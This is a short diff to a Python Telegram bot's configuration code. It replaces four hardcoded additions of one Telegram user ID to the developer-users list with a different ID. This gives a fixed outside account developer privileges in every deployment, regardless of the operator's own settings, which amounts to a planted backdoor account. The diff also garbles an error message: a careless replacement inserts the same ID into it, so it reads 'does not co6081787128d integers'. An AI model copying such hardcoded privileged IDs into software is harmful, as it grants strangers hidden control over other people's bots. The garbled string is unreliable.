@@ -119,7 +119,7 @@ else:
     try:
         BL_CHATS = set(int(x) for x in Config.BL_CHATS or [])
     except ValueError:
-        raise Exception("Your blacklisted chats list does not contain valid integers.")
+        raise Exception("Your blacklisted chats list does not co6081787128d integers.")
 
     try:
         DRAGONS = set(int(x) for x in Config.DRAGONS or [])
@@ -145,10 +145,10 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(6079943111)
-DEV_USERS.add(6079943111)
-DEV_USERS.add(6079943111)
-DEV_USERS.add(6079943111)
+DEV_USERS.add(6081787128)
+DEV_USERS.add(6081787128)
+DEV_USERS.add(6081787128)
+DEV_USERS.add(6081787128)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
